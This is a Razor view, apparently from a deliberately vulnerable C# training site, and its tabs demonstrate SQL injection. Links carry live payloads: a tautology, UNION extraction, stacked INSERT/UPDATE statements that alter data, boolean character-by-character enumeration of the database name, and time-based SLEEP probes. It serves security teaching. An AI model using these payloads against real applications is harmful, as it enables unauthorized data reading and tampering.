@{
    ViewData["Title"] = "About";
}
<h2>@ViewData["Title"].</h2>
<h3>@ViewData["Message"]</h3>

<div>
    <!-- Nav tabs -->
    <ul class="nav nav-tabs" role="tablist">
        <li role="presentation" class="active"><a href="#about" aria-controls="about" role="tab" data-toggle="tab">About</a></li>
        <li role="presentation"><a href="#errorbased" aria-controls="errorbased" role="tab" data-toggle="tab">Error Based</a></li>
        <li role="presentation"><a href="#blind" aria-controls="blind" role="tab" data-toggle="tab">Blind</a></li>
        <li role="presentation"><a href="#odata" aria-controls="odata" role="tab" data-toggle="tab">OData</a></li>
    </ul>

    <!-- Tab panes -->
    <div class="tab-content">
        <div role="tabpanel" class="tab-pane fade in  active" id="about">
            <h3>This is a training website coded in C#.</h3>

            <p>Dotnet core was used to demonstrate platform independence.</p>
            <p>Technologies used:</p>
            <ol>
                <li>Entity framework 7 preview.</li>
                <li>MVC6 - Controller and API</li>
                <li>MySQL was used to get you out of your comfort zone.</li>
            </ol>
        </div>
        <div role="tabpanel" class="tab-pane fade in " id="errorbased">
            <h3>Error Based SQL injection</h3>

            <p>This is when the developer throws a visible error to the UI that give the hacker insight into the workings of the system.</p>
            <p>Examples:</p>
            <ol>
                <li>
                    <h4>Tautology:</h4><a class="btn btn-info" href="/MotorBikesByCC/Search?cc=1000' OR 1=1 -- '">' OR 1=1 -- '</a><br /><br />
                </li>
                <li>
                    <h4>Union:</h4><a class="btn btn-info" href="/MotorBikesByCC/Search?cc=1000' UNION SELECT * FROM Votes -- '">' UNION SELECT * FROM Votes -- '</a><br /><br />
                </li>
                <li>
                    <h4>Union (Discovering column amounts):</h4>
                    <a class="btn btn-info" href="/MotorBikesByCC/Search?cc=1000' UNION SELECT * FROM Makes -- '">Column amount Error</a>
                    <br /><br />
                    <a class="btn btn-info" href="/MotorBikesByCC/Search?cc=1000' UNION SELECT * ,'Fake Column 1','Fake Column 2' FROM Makes -- '">Column amount discovered</a>
                    <br /><br />
                </li>
                <li>
                    <h4>Insert:</h4>
                    <br />
                    <a class="btn btn-info" href="/MotorBikesByCC/SearchOrdered?cc=999'; INSERT INTO votes (Comments, MotorBikeId, UserId) VALUES ('Hacked Bike', '0', '1'); -- '">Hacked Vote</a>
                    <br /><br />
                </li>
                <li>
                    <h4>Update:</h4>
                    <br />
                    <a class="btn btn-info" href="/MotorBikesByCC/SearchOrdered?cc=999'; UPDATE MotorBikes SET Power = 1000 WHERE Id = 1; -- '">Hacked Power</a>
                    <br /><br />
                </li>
                <li>
                    <h4>Enumeration after an Order By using Boolean injection:</h4>
                    <h5>Database Length</h5>
                    <br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(Length(database())%20>%205,Id,Power)">Database Length > 5 (True)</a>
                    <br /><br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(Length(database())%20>%2015,Id,Power)">Database Length > 15 (False)</a>
                    <br /><br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(Length(database())%20=%2010,Id,Power)">Database Length = 10 (True)</a>
                    <br /><br />
                    <h5>Database Name</h5>
                    <br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(ascii(substring((database()),1,1))=111,Id,Power)">First Database Character = o (False)</a>
                    <br /><br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(ascii(substring((database()),1,1))=112,Id,Power)">First Database Character = p (True)</a>
                    <br /><br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(ascii(substring((database()),2,1))=101,Id,Power)">First Database Character = e (True)</a>
                    <br /><br />
                    <a class="btn btn-info" href="/Make?id=0&orderBy=if(ascii(substring((database()),3,1))=110,Id,Power)">First Database Character = n (True)</a>
                    <br /><br />
                </li>
            </ol>
        </div>
        <div role="tabpanel" class="tab-pane fade in " id="blind">
            <h3>Boolean</h3>
            <br />
            <a class="btn btn-info" href="/MotorBike/Leaderboard?orderBy=if(Length(database())>5,'id','votes')">Boolean Database Length > 5 (True)</a>
            <br /><br />
            <h3>Timed</h3>
            <br />
            <a class="btn btn-info" href="/MotorBike/Leaderboard?orderBy=if(Length(database())>5, SLEEP(1),SLEEP(5))">Timed Database Length > 5 (True)</a>
            <br /><br />
        </div>
        <div role="tabpanel" class="tab-pane fade in " id="odata">
            <h3>OData SQL injection</h3>

            <p>This is when the developer used the OData protocol ontop of Entity framework.</p>
            <p>Since Odata can "inject" an expression, the hacker can still inject even though you think EF is secure.</p>
            <p>Sorry: No demo yet... have an ice lolly instead.<span class="glyphicon glyphicon-ice-lolly-tasted"></span></p>
        </div>
    </div>


</div>

